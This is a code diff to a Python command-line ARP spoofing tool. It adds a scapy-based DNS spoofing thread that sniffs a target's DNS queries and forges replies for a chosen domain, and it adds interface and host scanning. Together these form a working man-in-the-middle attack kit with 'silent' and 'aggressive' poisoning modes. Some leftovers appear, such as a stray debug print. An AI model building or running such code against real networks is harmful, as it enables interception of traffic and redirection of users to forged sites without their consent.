@@ -2,8 +2,11 @@ import argparse
 import sys
 import os
 import shlex
-from scan_hosts import scan_hosts
+from scan_hosts import scan_hosts, scan_ifaces
 from arp_spoofing import arp_spoof
+from dns_spoofing import dns_spoof
+import threading
+import scapy.all as sc
 
 
 def print_title():
@@ -24,7 +27,8 @@ def print_commands():
     commands = """
         Available Commands:
         start         - Start the spoofing process in default mode
-        scan          - Scan for available hosts
+        scanif        - Scan for available interfaces
+        scan          - Scan for available hosts using -face interface
         silent        - Run in silent mode (minimal network disturbance)
         aggressive    - Run in "all out" mode (maximum disruption/logging)
         stop          - Stop all spoofing and restore network state
@@ -53,7 +57,26 @@ def handle_command(cmd):
         if not ip or not mac or not ipToSpoof:
             print("[!] Usage: start -ip <target_ip> -mac <target_mac> -iptospoof <spoofed_ip>")
             return
-        print("[*] Spoofing {ip} (MAC: {mac}) as {ipToSpoof} ... Press Ctrl+C to stop.")
+        print("[*] Spoofing %s (MAC: %s ) as %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof))
+
+        target_domain = raw_input("Enter the domain to spoof (e.g. example.com.): ").strip()
+        if not target_domain.endswith('.'):
+            target_domain += '.'
+        target_domain = target_domain.encode()
+        print("[*] Spoofing %s (MAC: %s) as %s and DNS spoofing %s ... Press Ctrl+C to stop." % (ip, mac, ipToSpoof, target_domain))
+
+        # Start a new thread for DNS spoofing in order 
+        def dns_spoof_thread():
+            print("AAAAAAAAAAAAAAAA")
+            sc.sniff(
+                filter=("udp port 53 and src %s" % ip),
+                prn=lambda packet: dns_spoof(packet, ip, ipToSpoof, target_domain)
+            )
+
+        dns_thread = threading.Thread(target=dns_spoof_thread)
+        dns_thread.daemon = True
+        dns_thread.start()
+
         import time
         try:
             while True:
@@ -61,8 +84,15 @@ def handle_command(cmd):
                 time.sleep(2)
         except KeyboardInterrupt:
             print("\n[!] Stopped spoofing.")
-    elif cmd == "scan":
-        scan_hosts() # Scan available hosts
+    elif cmd == "scanif":
+        scan_ifaces() # Scan available host
+    elif cmd.startswith("scan"):
+        args = shlex.split(cmd)
+        iface = None
+        for i, arg in enumerate(args):
+            if arg == "-iface" and i + 1 < len(args):
+                iface = args[i + 1]
+        scan_hosts(iface) # Scan available hosts
     elif cmd == "silent":
         print("[*] Starting in silent mode (stealthy ARP poisoning)...")
         # Start spoofing in silent mode
